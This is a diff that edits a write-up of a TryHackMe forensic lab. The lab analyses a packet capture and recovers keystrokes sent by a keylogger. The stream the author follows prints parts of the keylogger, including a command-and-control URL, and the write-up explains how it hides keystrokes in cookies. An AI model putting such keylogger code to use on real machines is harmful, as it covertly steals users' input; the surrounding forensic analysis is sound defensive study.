@@ -1,33 +1,40 @@
 # [Packed Light](https://tryhackme.com/room/hh-packedlight-02e5330c)
 
-- Day 4 of hackers holiday. 
-- A forensic lab involving analyzing a PCAP file.
+- Day 4 of Hacker's Holiday. 
+- A forensic lab that involves analyzing a PCAP file.
+
 ![screenshot](../data/pl1.png)
-- Downlaod the attachment and unzip it.
+
+- Download the attachment and unzip it.
 
 ```
 ~/TryHackMe/Hackers_holiday ❯ unzip packed-light-forensics-1784224937659.zip 
 Archive:  packed-light-forensics-1784224937659.zip
   inflating: traffic.pcapng       
 ```
-- open the traffic in wireshark.
+- Open the capture in Wireshark.
+
 ![screenshot](../data/pl2.png)
 
-- In @0xMia's STORY  he mentioned his laptop is pingin an 8080 adress. lets see what the port deals with.
-- Lets apply the wireshark filter 
+- In @0xMia's STORY  he mentioned his laptop is pinging an address on port 8080. Let's see what is running on that port.
+- Let's apply the Wireshark filter. 
 ```
 tcp.dstport == 8080
 ```
+
 ![screenshot](../data/pl3.png)
 
-- we can see lots of tcp and http packets lets narrow it down to http.
+- We can see many TCP and HTTP packets. Let's narrow it down to HTTP.
 
 ```
 tcp.dstport == 8080 and http
 ```
+
 ![screenshot](../data/pl4.png)
-- The first http request is downloaded a updates.py file lets see what it is . as it is only http not https we cna clearly see the traffic without any encryption.
-- Righ click on the packet and select follow > tcp stream.
+
+- The first HTTP request downloads an `updates.py` file. Let's inspect it. Since the traffic uses HTTP rather than HTTPS, we can clearly view it without encryption.
+- Right-click on the packet and select Follow > TCP stream.
+
 ```
 C2_URL = "http://byte-lotus-hotel.thm:8080/"
 
@@ -67,7 +74,7 @@ print("[*] Byte Lotus Sync Service started...")
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
 ```
-- This code is a simple keylogger that captures keystrokes, lightly obfuscates them with XOR, Base64-encodes the result, and sends each keystroke to a remote server in an HTTP cookie.
+- This code is a simple keylogger that captures keystrokes, lightly obfuscates them with XOR, Base64-encodes the result, and sends each keystroke to a remote server inside an HTTP cookie.
 
 ```
 Keyboard Input
@@ -82,14 +89,10 @@ Place in HTTP Cookie
       ↓
 Send GET request to C2 server 
 ```
-- It is a simple encryption easily reversed, before that we need to extract the encryption text from the cookie field. for that i am going to use tshark.
+- This is a simple form of obfuscation and is easy to reverse. Before doing that, we need to extract the encrypted text from the cookie field. For that, I'm going to use Tshark.
 
 ```
 tshark -r traffic.pcapng -Y http -T fields -e http.cookie
-tshark: Couldn't load plugin 'falco-events.so': /usr/lib/x86_64-linux-gnu/libgrpc++.so.1.51: undefined symbol: _Z29grpc_json_get_string_propertyRKN9grpc_core4JsonEPKcPN4absl7debian96StatusE
-tshark: Error processing rsa_privkeys:
-Error loading RSA key file /home/light/Root_me/netwoking/rsakey.pem: No such file or directory
-
 
 hotel_sess_state=HA==
 
@@ -151,8 +154,10 @@ hotel_sess_state=PQ==
 
 hotel_sess_state=NQ==
 ```
-- Now replace the "hotel_sess_state=" from the above output and note the base64 values . 
-- I wrote this simple python script to decod this cahrecters . 
+
+- Now remove `hotel_sess_state=` from the output above and keep only the Base64 values. 
+- I wrote this simple Python script to decode these characters. 
+
 ```
 import base64
 
@@ -201,7 +206,7 @@ for s in encoded_strings:
 print("Recovered text:")
 print(repr(plaintext))
 ```
-- The code simply decode each encoded_string from base64 , then xor it using the key and combines it to get the final word.
+- The script simply decodes each Base64 string, XORs it with the key, and combines the resulting characters to recover the final text.
 ```
  python3 decode.py 
 Recovered text:
